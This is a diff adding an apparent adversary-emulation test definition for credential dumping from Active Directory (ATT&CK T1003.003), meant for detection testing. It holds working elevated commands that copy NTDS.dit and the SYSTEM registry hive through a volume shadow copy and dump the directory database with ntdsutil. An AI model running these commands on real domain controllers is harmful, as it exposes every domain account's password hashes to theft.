@@ -1,0 +1,110 @@
+attack_technique: T1003.003
+display_name: "OS Credential Dumping: NTDS"
+atomic_tests:
+- name: Create Volume Shadow Copy with NTDS.dit
+  auto_generated_guid: dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f
+  description: |
+    This test is intended to be run on a domain Controller.
+
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+  supported_platforms:
+  - windows
+  input_arguments:
+    drive_letter:
+      description: Drive letter to source VSC (including colon)
+      type: String
+      default: 'C:'
+  dependencies:
+  - description: |
+      Target must be a Domain Controller
+    prereq_command: |
+      reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+    get_prereq_command: |
+      echo Sorry, Promoting this machine to a Domain Controller must be done manually
+  executor:
+    command: |
+      vssadmin.exe create shadow /for=#{drive_letter}
+    name: command_prompt
+    elevation_required: true
+
+- name: Copy NTDS.dit from Volume Shadow Copy
+  auto_generated_guid: c6237146-9ea6-4711-85c9-c56d263a6b03
+  description: |
+    This test is intended to be run on a domain Controller.
+
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+
+    This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+    A successful test also requires the export of the SYSTEM Registry hive. 
+    This test must be executed on a Windows Domain Controller.
+  supported_platforms:
+  - windows
+  input_arguments:
+    vsc_name:
+      description: Name of Volume Shadow Copy
+      type: String
+      default: '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1'
+    extract_path:
+      description: Path for extracted NTDS.dit
+      type: Path
+      default: C:\Windows\Temp
+  dependencies:
+  - description: |
+      Target must be a Domain Controller
+    prereq_command: |
+      reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+    get_prereq_command: |
+      echo Sorry, Promoting this machine to a Domain Controller must be done manually
+  - description: |
+      Volume shadow copy must exist
+    prereq_command: |
+      if not exist #{vsc_name} (exit /b 1)
+    get_prereq_command: |
+      echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with NTDS.dit'" to fulfuill this requirement
+  - description: |
+      Extract path must exist
+    prereq_command: |
+      if not exist #{extract_path} (exit /b 1)
+    get_prereq_command: |
+      mkdir #{extract_path}
+  executor:
+    command: |
+      copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
+      copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
+      reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+    cleanup_command: |
+      del "#{extract_path}\ntds.dit"        >nul 2> nul
+      del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
+      del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
+    name: command_prompt
+    elevation_required: true
+
+- name: Dump Active Directory Database with NTDSUtil
+  auto_generated_guid: 2364e33d-ceab-4641-8468-bfb1d7cc2723
+  description: |
+    This test is intended to be run on a domain Controller.
+
+    The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
+    uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
+    subsequent domain controllers without the need of network-based replication.
+
+    Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_folder:
+      description: Path where resulting dump should be placed
+      type: Path
+      default: C:\Windows\Temp
+  dependencies:
+  - description: |
+      Target must be a Domain Controller
+    prereq_command: |
+      reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+    get_prereq_command: |
+      echo Sorry, Promoting this machine to a Domain Controller must be done manually
+  executor:
+    command: |
+      ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
+    name: command_prompt
+    elevation_required: true
